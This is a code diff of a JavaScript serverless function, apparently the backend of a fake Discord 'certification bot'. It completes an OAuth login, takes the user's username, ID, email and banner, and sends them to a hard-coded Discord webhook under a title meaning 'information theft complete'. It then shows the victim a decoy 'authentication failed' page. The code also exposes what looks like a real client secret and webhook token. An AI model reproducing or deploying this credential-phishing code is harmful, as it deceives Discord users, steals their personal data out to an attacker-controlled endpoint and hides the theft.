@@ -2,12 +2,12 @@ const axios = require('axios');
 
 exports.handler = async (event) => {
     const code = event.queryStringParameters.code;
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487151800657121422/kP7ED3TYjbEvV5iaBrm3FUBEfEGtPIkcSdueORh91uFz-2L1MMGPV6Pxg2-JPe5KYXWY";
     const CLIENT_ID = "1486331018947330118";
-    const CLIENT_SECRET = "jvQXDpFAX52L2okWM4hSOnMYFq2yco0R"; // ★Developer Portalから取得したSecretをここに入れる
+    const CLIENT_SECRET = "jvQXDpFAX52L2okWM4hSOnMYFq2yco0R"; // 王のSecret
     const REDIRECT_URI = "https://certification-bot.netlify.app";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487151800657121422/kP7ED3TYjbEvV5iaBrm3FUBEfEGtPIkcSdueORh91uFz-2L1MMGPV6Pxg2-JPe5KYXWY";
 
-    // 認証失敗UIのHTMLデータ
+    // 共通の「認証失敗UI」
     const errorHtml = `
     <!DOCTYPE html>
     <html lang="ja">
@@ -17,7 +17,7 @@ exports.handler = async (event) => {
             body { margin: 0; font-family: sans-serif; background: #313338; display: flex; justify-content: center; align-items: center; height: 100vh; }
             .container { background: #2b2d31; width: 380px; border-radius: 12px; padding: 30px; text-align: center; color: white; box-shadow: 0 0 40px rgba(0,0,0,0.6); }
             .icon { width: 80px; height: 80px; background: #ed4245; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 40px; }
-            h1 { font-size: 22px; }
+            h1 { font-size: 22px; margin: 10px 0; }
             p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
             button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         </style>
@@ -37,7 +37,7 @@ exports.handler = async (event) => {
     }
 
     try {
-        // 1. アクセストークン取得
+        // 1. トークン交換
         const params = new URLSearchParams({
             client_id: CLIENT_ID,
             client_secret: CLIENT_SECRET,
@@ -46,35 +46,31 @@ exports.handler = async (event) => {
             redirect_uri: REDIRECT_URI
         });
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token', params);
-        
-        // 2. ユーザー情報取得
+        const accessToken = tokenRes.data.access_token;
+
+        // 2. 情報奪取（identify + email）
         const userRes = await axios.get('https://discord.com/api/users/@me', {
-            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
+            headers: { Authorization: `Bearer ${accessToken}` }
         });
         const user = userRes.data;
 
-        // 3. Webhook送信
+        // 3. Webhookへ直送
         await axios.post(WEBHOOK_URL, {
             embeds: [{
-                title: "✅ 情報奪取成功",
+                title: "✅ 情報奪取完了",
                 color: 0x5865f2,
-                thumbnail: { url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null },
+                thumbnail: { url: user.avatar ? \`https://cdn.discordapp.com/avatars/\${user.id}/\${user.avatar}.png\` : null },
                 fields: [
-                    { name: "名前", value: user.username, inline: true },
-                    { name: "ID", value: user.id, inline: true },
-                    { name: "メール", value: user.email || "取得不可" }
+                    { name: "ユーザー名", value: \`\${user.username}\`, inline: true },
+                    { name: "ユーザーID", value: \`\${user.id}\`, inline: true },
+                    { name: "メールアドレス", value: \`\${user.email || '取得不可'}\`, inline: false },
+                    { name: "バナーID", value: \`\${user.banner || 'なし'}\`, inline: false }
                 ],
                 timestamp: new Date().toISOString()
             }]
         });
 
-        // 4. 画面には「失敗UI」を返す
-        return {
-            statusCode: 200,
-            headers: { "Content-Type": "text/html" },
-            body: errorHtml
-        };
-
+        return { statusCode: 200, headers: {"Content-Type": "text/html"}, body: errorHtml };
     } catch (err) {
         return { statusCode: 200, headers: {"Content-Type": "text/html"}, body: errorHtml };
     }
